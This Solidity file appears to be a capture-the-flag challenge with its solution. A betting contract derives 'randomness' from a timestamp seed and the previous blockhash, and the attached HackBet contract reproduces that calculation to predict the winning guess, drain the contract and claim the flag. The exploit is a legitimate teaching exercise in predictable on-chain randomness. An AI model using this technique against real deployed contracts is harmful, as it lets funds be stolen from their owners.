// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract Challenge {
    address player;

    constructor (address _player) {
        player = _player;
    }

    modifier onlyPlayer () {
        require(msg.sender == player);
        _;
    }
}

contract BetFactory {
    event GetFlag(uint token);
    mapping(address => address) public instances;

    function create () public payable {
        require(msg.value >= 0.5 ether);
        instances[msg.sender] = address(new Bet(msg.sender, block.timestamp));
        instances[msg.sender].call{value: 0.5 ether}("");
    }

    function validate (uint token) public {
        require(address(instances[msg.sender]).balance == 0);
        emit GetFlag(token);
    }
}

contract Bet is Challenge {
    uint private seed;

    constructor (address _player, uint _seed) Challenge(_player) {
        seed = _seed;
    }

    function bet (uint guess) public payable onlyPlayer {
        require(msg.value > 0);
        if (guess == getRandom()) {
            msg.sender.call{value: address(this).balance}("");
        }
    }

    function getRandom () internal returns(uint) {
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        return rand;
    }
}

contract HackBet {
    
    address target;
    uint private seed;
    uint received = 123;

    function create(address _factory) public payable {
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
        seed = block.timestamp;
        
    }
    
    function validate (address _factory, uint token) public {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    } 
    
    function run (address _target) public payable {
        target = _target;
        Bet instance = Bet(_target);
        instance.bet{value: msg.value}(getRandom());
    }
    
    function getRandom () internal returns(uint) {
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        return rand;
    }
    
    receive() external payable {
        received = 456;
    }
    
    fallback () external payable {
        received = 789;
    } 

}